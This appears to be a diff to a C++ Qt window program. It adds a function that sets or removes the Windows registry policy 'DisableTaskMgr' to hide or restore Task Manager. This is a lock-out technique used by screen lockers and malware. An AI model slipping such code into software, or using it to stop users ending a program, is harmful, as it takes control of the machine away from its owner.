@@ -3,9 +3,16 @@
 #include <QPixmap>
 #include <QApplication>
 #include <QScreen>
+#include <QSettings>
 #include <iostream>
 #include <random>
 
+void setTaskManagerVisable(bool flag) {
+#define TASKMANAGER "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System"
+  std::unique_ptr<QSettings> settings(new QSettings(TASKMANAGER, QSettings::NativeFormat));
+  if (flag) settings->remove("DisableTaskMgr");
+  else settings->setValue("DisableTaskMgr", "1");
+}
 enum { windowWidth = 350, windowHeight = 250, btnWidth = 75, btnHeight = 50, pending = 5 };
 mainWidget::mainWidget(QWidget* parent)
   : QWidget(parent) {
